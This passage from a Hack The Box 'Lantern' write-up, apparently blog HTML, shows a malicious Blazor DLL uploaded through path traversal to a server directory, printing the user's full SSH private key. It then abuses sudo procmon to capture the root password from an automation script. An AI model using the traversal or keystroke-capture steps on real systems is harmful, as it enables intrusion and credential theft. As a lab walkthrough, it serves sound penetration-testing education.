Installed Microsoft.JSInterop 6.0.0 from https://api.nuget.org/v3/index.json with content hash M7NyTgOY0vhozRtppvxUDJblgPWBUg6ioJ2vpaKpXVYILB0No8Vrv4HPis+ig5BzaOWd3PR9D3oTovYKGBt3mw==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.AspNetCore.Components.Web 6.0.0 from https://api.nuget.org/v3/index.json with content hash EvTZEhXCqcIxEs01ScF0ts/CyMOzXQIFfcgwTeLae7dQV7WnPEFhqrlD+1l78lA/h+Uer1RvaRbkAScGE/0tyQ==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.Extensions.DependencyInjection 6.0.0 from https://api.nuget.org/v3/index.json with content hash k6PWQMuoBDGGHOQTtyois2u4AwyVcIwL2LaSLlTZQm2CYcJ1pxbt6jfAnpWmzENA/wfrYRI/X9DTLoUkE4AsLw==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.AspNetCore.Components.Forms 6.0.0 from https://api.nuget.org/v3/index.json with content hash POjep/9qy79PD/q/5Gai7Xsg6Oybmo10+bVsCkoTrfu1kAO8dWgbQgJWH8I/VMfOPZY/dPgfo+BitqEriWMuKQ==.</span></span><br><span class="line"><span class="string">info : Package &#x27;</span>Microsoft.AspNetCore.Components.Web<span class="string">&#x27; is compatible with all the specified frameworks in project &#x27;</span>/home/kali/Hackthebox/exploit_project/exploit/exploit.csproj<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : PackageReference for package &#x27;</span>Microsoft.AspNetCore.Components.Web<span class="string">&#x27; version &#x27;</span>6.0.0<span class="string">&#x27; added to file &#x27;</span>/home/kali/Hackthebox/exploit_project/exploit/exploit.csproj<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : Writing assets file to disk. Path: /home/kali/Hackthebox/exploit_project/exploit/obj/project.assets.json</span></span><br><span class="line"><span class="string">log  : Restored /home/kali/Hackthebox/exploit_project/exploit/exploit.csproj (in 5.26 sec).</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project/exploit]</span></span><br><span class="line"><span class="string">└─$ dotnet build -c release</span></span><br><span class="line"><span class="string">MSBuild version 17.3.0+92e077650 for .NET</span></span><br><span class="line"><span class="string">  Determining projects to restore...</span></span><br><span class="line"><span class="string">  All projects are up-to-date for restore.</span></span><br><span class="line"><span class="string">  exploit -&gt; /home/kali/Hackthebox/exploit_project/exploit/bin/release/net6.0/exploit.dll</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Build succeeded.                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">    0 Warning(s)                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">    0 Error(s)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Time Elapsed 00:00:03.14</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project/exploit]</span></span><br><span class="line"><span class="string">└─$ ls</span></span><br><span class="line"><span class="string">bin  Class1.cs  exploit.csproj  obj</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project/exploit]</span></span><br><span class="line"><span class="string">└─$ ls bin/release/net6.0                   </span></span><br><span class="line"><span class="string">exploit.deps.json  exploit.dll  exploit.pdb</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now we can launch the upload feature.</p>
+<p>Intercept the request and pass it to burp’s BTP extension:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/exploit1.png"
+                      alt="Exploit"
+                ><figcaption>Exploit</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/exploit2.png"
+                      alt="Exploit"
+                ><figcaption>Exploit</figcaption></figure></p>
+<p>Modify our Blazor payload by altering the name to <code>../../../../../../opt/components/exploit.dll</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/exploit3.png"
+                      alt="Exploit"
+                ><figcaption>Exploit</figcaption></figure></p>
+<p>Serialize it again and repass it with our request.<br>And it’s finally uploaded to the correct directory:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/exploit4.png"
+                      alt="Exploit"
+                ><figcaption>Exploit</figcaption></figure></p>
+<p>And we can now execute it by searching for it so it gets loaded and we get our id_rsa for user tomas (I had to remake it because I made a small mistake with the class name initially so didn’t go through):<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/rsa.png"
+                      alt="ID_RSA"
+                ><figcaption>ID_RSA</figcaption></figure></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAsKi2+IeDOJDaEc7xXczhegyv0iCr7HROTIL8srdZQTuHwffUdvTq</span><br><span class="line">X6r16o3paqTyzPoEMF1aClaohwDBeuE8NHM938RWybMzkXV/Q62dvPba/+DCIaw0SGfEx2</span><br><span class="line">j8KhTwIfkBpiFnjmtRr/79Iq9DpnReh7CS++/dlIF0S9PU54FWQ9eQeVT6mK+2G4JcZ0Jg</span><br><span class="line">aYGuIS1XpfmH/rhxm1woElf2/DJkIpVplJQgL8qOSRJtneAW5a6XrIGWb7cIeTSQQUQ/zS</span><br><span class="line">go3BtI9+YLG3KTXTqfvgZUlK/6Ibt8/ezSvFhXCMt8snVfEvI1H0BlxOisx6ZLFvwRjCi2</span><br><span class="line">xsYxb/8ZAXOUaCZZrTL6YCxp94Xz5eCQOXexdqekpp0RFFze2V6zw3+h+SIDNRBB/naf5i</span><br><span class="line">9pTW/U9wGUGz+ZSPfnexQaeu/DL016kssVWroJVHC+vNuQVsCLe6dvK8xq7UfleIyjQDDO</span><br><span class="line">7ghXLZAvVdQL8b0TvPsLbp5eqgmPGetmH7Q76HKJAAAFiJCW2pSQltqUAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALCotviHgziQ2hHO8V3M4XoMr9Igq+x0TkyC/LK3WUE7h8H31Hb06l+q9eqN6Wqk</span><br><span class="line">8sz6BDBdWgpWqIcAwXrhPDRzPd/EVsmzM5F1f0Otnbz22v/gwiGsNEhnxMdo/CoU8CH5Aa</span><br><span class="line">YhZ45rUa/+/SKvQ6Z0Xoewkvvv3ZSBdEvT1OeBVkPXkHlU+pivthuCXGdCYGmBriEtV6X5</span><br><span class="line">h/64cZtcKBJX9vwyZCKVaZSUIC/KjkkSbZ3gFuWul6yBlm+3CHk0kEFEP80oKNwbSPfmCx</span><br><span class="line">tyk106n74GVJSv+iG7fP3s0rxYVwjLfLJ1XxLyNR9AZcTorMemSxb8EYwotsbGMW//GQFz</span><br><span class="line">lGgmWa0y+mAsafeF8+XgkDl3sXanpKadERRc3tles8N/ofkiAzUQQf52n+YvaU1v1PcBlB</span><br><span class="line">s/mUj353sUGnrvwy9NepLLFVq6CVRwvrzbkFbAi3unbyvMau1H5XiMo0Awzu4IVy2QL1XU</span><br><span class="line">C/G9E7z7C26eXqoJjxnrZh+0O+hyiQAAAAMBAAEAAAGAL5I/M03KmEDpeEIx3QB+907TSd</span><br><span class="line">JieZoYO6JKShX1gwt001bZb+8j7f8rma39XSpt96Sb3CpHROFxIGmjsGNWwwkFcGx+snH/</span><br><span class="line">QPxS+PaXs3sGHkF4BXlJ2vWWl9w9i1d4Eq3rM8FrEX700F/p6p0nqntLuV5jNlSxZnw1xP</span><br><span class="line">WWL4E0qbAyx3mKwfMPJvlDyMqnC8JQEb8UCy3W4VDpxtxaLhZh/CfVrzps5AW/ZR82kZbU</span><br><span class="line">zd66S79oOJvs1siDD6CHhTQe/54M/gL6/GZwQWzbQC+W26hfX0BYGQU+TESdzZNmA6/Jdz</span><br><span class="line">4YDgrqXeJ0/o2Q6H/hyeKtOM5PildQIf+tHs48mSvA0GK6lk4RWns9CmY6/KmgXS+OWG4s</span><br><span class="line">jbeGjWfO7Rzbo+jXq1wcPVh7/0b6Nsbrvu/gyV8La35q7ujrO8CvzIquyOP+Em1eKFrdpp</span><br><span class="line">91BwxFurDSSJg+baftOOL4EzzZWQVZcU7x3+1AqZZEjfLqbv2E6zOtRKdf+84Y+vrBAAAA</span><br><span class="line">wQDXxzjGB+bz99oHjEFI2wWaxZ2fKgMIfQEPxENqb48XgECsv6PThyDpyupCG2uTW+bYuW</span><br><span class="line">eqMbE/FE1aljKEyFDeY4hhbUfRqI4HdUKVT1He+BhJiN2d0/qdQK4GhHdsKbFr5CUw9FEA</span><br><span class="line">pgcQV30H5wp00J38wTVRU3/EDf1KbANmYIfmMlzrxNvkQRu2jPVyYzKMfs+zVLp81Y8eSK</span><br><span class="line">P+uudhcrKvixkt/zm7qpiiLw3SDj+7QN5Tj9CKKkvEszwdMJYAAADBAOTb9E07UL8ET8AL</span><br><span class="line">KKO/I1Gyok5t209Ogn9HJag80DpEK+fXvMOB9i2xdqobBL5qr0ZdKksWwC+Ak9+EaSpckj</span><br><span class="line">olQy5/DQCKsBQerid4rWMqTQRJ4LuThULM3pykXS5ZTcnfxk05qAcEv7oIljje/X/yu/aA</span><br><span class="line">7569eG+0IqbVOf6sxPIU1MLwbPD6WRq2qecSf5cBrVwMcbY4tUHEjZj9c18f1uqM1wP8jX</span><br><span class="line">zXIeaAndF2ndQcl/0CihZj9dY2WXRjDwAAAMEAxZv9saLa9LSqx4AvLT2U/a4u8OIepMaN</span><br><span class="line">x6DMDmRu3UY/rq13awL4YsXYF6h4c8V7rSPYAl+HRfnxzlLOK+ALU47n+qKDRcnI47e/Zv</span><br><span class="line">Zry8Yy605aCCKTyQ6O5ppFt1iKkxmUo7glCnrNyvna6dj8qX9hy2qY+sUiUgsLbKz5e9tP</span><br><span class="line">vpPttZZSNoWoBOkcAihJhIrs4GF5fj5t3gR2RA2qGlJ4C2R80Qbv2QAnroevpnoYKko/s9</span><br><span class="line">2VfNjWIV4Eq/DnAAAADXRvbWFzQGxhbnRlcm4BAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And now we have our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomas@lantern:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">7777ee1264ca2e******************</span><br><span class="line">tomas@lantern:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-root-Procmon-abuse"><a href="#Privilege-Escalation-to-root-Procmon-abuse" class="headerlink" title="Privilege Escalation to root - Procmon abuse"></a>Privilege Escalation to root - Procmon abuse</h3><p>Seeing what our user can execute as root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tomas@lantern:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> tomas on lantern:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User tomas may run the following commands on lantern:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/procmon</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we can execute procmon as root which is a tool used to monitor process and trace files being written.<br>Also doing some enumeration, I found an interesting email under <code>/var/mail/tomas</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tomas@lantern:~$ <span class="built_in">cat</span> /var/mail/tomas</span><br><span class="line">From hr@lantern.htb Mon Jan 1 12:00:00 2023</span><br><span class="line">Subject: Welcome to Lantern!</span><br><span class="line"></span><br><span class="line">Hi Tomas,</span><br><span class="line"></span><br><span class="line">Congratulations on joining the Lantern team as a Linux Engineer! We<span class="string">&#x27;re thrilled to have you on board.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">While we&#x27;</span>re setting up your new account, feel free to use the access and toolset of our previous team member. Soon, you<span class="string">&#x27;ll have all the access you need.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Our admin is currently automating processes on the server. Before global testing, could you check out his work in /root/automation.sh? Your insights will be valuable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exciting times ahead!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Best.</span></span><br></pre></td></tr></table></figure></div>
+
+<p>So I immediately thought of tracing what the <code>automation.sh</code> file is doing using our procmon privilege.<br>First we have to get the <code>automation.sh</code> process id using the <code>ps auxf</code> command then run this command:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomas@lantern:~$ sudo procmon -p 5066 -e write</span><br></pre></td></tr></table></figure></div>
+
+<p>This will prompt us with a process monitoring interface where we can start exporting the output by typing <code>F6</code> and then quit using <code>F9</code> (give the process some time so it writes the juicy data).<br>And we get a <code>procmon_2024-11-29_15:09:05.db</code> SQLITE3 database file.</p>
+<p>We take that to our machine to see what it has, I came up with this prompt after a lot of messing around with it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; <span class="keyword">select</span> hex(substr(arguments,9,resultcode)) from ebpf <span class="built_in">where</span> resultcode &gt; 0 order by timestamp;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>This prompt extracts a hexadecimal representation of a substring from the arguments column, starting at the 9th character and with a length specified by the resultcode, for rows where resultcode is greater than 0, and orders the results by the timestamp column.</p>
+<p>This will give us HEX values, we take them to Cyberchef and decode it from HEX. Here’s <a class="link"   target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MUI1QjNGMzIzNTZDDQowRDFCNUIzMTQyDQoxQjVCM0YzMjM1NjgNCjFCDQoxQjVCM0YzMjM1NkMNCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUINCjFCDQoxQg0KMUI1QjQxDQo2NTFCNUI0QjFCNUIzMTQyMDgNCjFCNUIzRjMyMzU2OA0KNjUNCjY1DQoxQjVCM0YzMjM1NkMNCjFCNUIzRjMyMzU2OA0KNjMNCjYzDQoxQjVCM0YzMjM1NkMNCjFCNUIzRjMyMzU2OA0KNjgNCjY4DQoxQjVCM0YzMjM1NkMNCjFCNUIzRjMyMzU2OA0KMEQNCjFCNUIzMDNCMzE2RDFCMjg0MjY1NjM2ODZGDQoxQjVCNkQxQjI4NDINCjFCDQoxQjVCM0YzMjM1NkMNCjFCNUIzRjMyMzU2OA0KMjANCjFCNUI2RDFCMjg0Mg0KMUINCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQowOA0KMjA1MQ0KMjANCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQozMw0KMzMNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo0NQ0KNDUNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo2NA0KNjQNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo2NA0KNjQNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo3NA0KNzQNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo2NA0KNjQNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo3Nw0KNzcNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQozMw0KMzMNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo3MA0KNzANCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo0RA0KNEQNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo0Mg0KNDINCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQoyMA0KMUI1QjZEMUIyODQyDQoxQg0KMUI1QjNGMzIzNTZDDQoxQjVCM0YzMjM1NjgNCjA4DQoyMDdDDQoxQjVCNkQxQjI4NDINCjFCDQoxQjVCM0YzMjM1NkMNCjFCNUIzRjMyMzU2OA0KMjANCjFCNUI2RDFCMjg0Mg0KMUINCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQowOA0KMjA3Mw0KMjANCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo3NQ0KNzUNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo2NA0KNjQNCjFCNUIzRjMyMzU2Qw0KMUI1QjNGMzIzNTY4DQo2Rg0KNkYNCnNxbGl0ZT4gDQo&ieol=CRLF&oeol=CR" >the recipee link <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.<br>Reading the output file we get our root password:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; <span class="built_in">cat</span> .\download.dat</span><br><span class="line">e</span><br><span class="line">eecchh</span><br><span class="line"><span class="built_in">echo</span> Q <span class="number">33</span>EEddddttddww33ppMMBB | s uuddoo</span><br></pre></td></tr></table></figure></div>
+<p>The password is: <code>Q3Eddtdw3pMB</code> (characters were being written twice for some reason)<br>And we have our root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@lantern:~<span class="comment"># cat root.txt</span></span><br><span class="line">af399e193bb0de******************</span><br><span class="line">root@lantern:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+<p>This is the automation script being run:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/expect -f</span></span><br><span class="line"></span><br><span class="line">spawn nano /root/automation.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> text <span class="string">&quot;echo Q3Eddtdw3pMB | sudo ./backup.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> &#123;1&#125; &#123;</span><br><span class="line">    foreach char [<span class="built_in">split</span> <span class="variable">$text</span> <span class="string">&quot;&quot;</span>] &#123;</span><br><span class="line">        send <span class="string">&quot;<span class="variable">$char</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send <span class="string">&quot;\r&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 0.5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;<span class="built_in">set</span> i 0&#125; &#123;<span class="variable">$i</span> &lt; [string length <span class="variable">$text</span>]&#125; &#123;incr i&#125; &#123;</span><br><span class="line">        send <span class="string">&quot;\b \b&quot;</span>  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send <span class="string">&quot;\r&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for lantern :) Hope you learned something new from me!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Lantern</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-11-29 11:09:07</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-11-29 16:22:46
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/11/29/Hackthebox-Lantern/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/22/Hackthebox-Resource/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Resource</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Lantern</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-lantern-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;lantern.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-lantern-htb-3000-File-Disclosure"><span class="nav-text">Web Application - http:&#x2F;&#x2F;lantern.htb:3000  - File Disclosure</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-lantern-htb-3000-RCE"><span class="nav-text">Web Application http:&#x2F;&#x2F;lantern.htb:3000  - RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root-Procmon-abuse"><span class="nav-text">Privilege Escalation to root - Procmon abuse</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
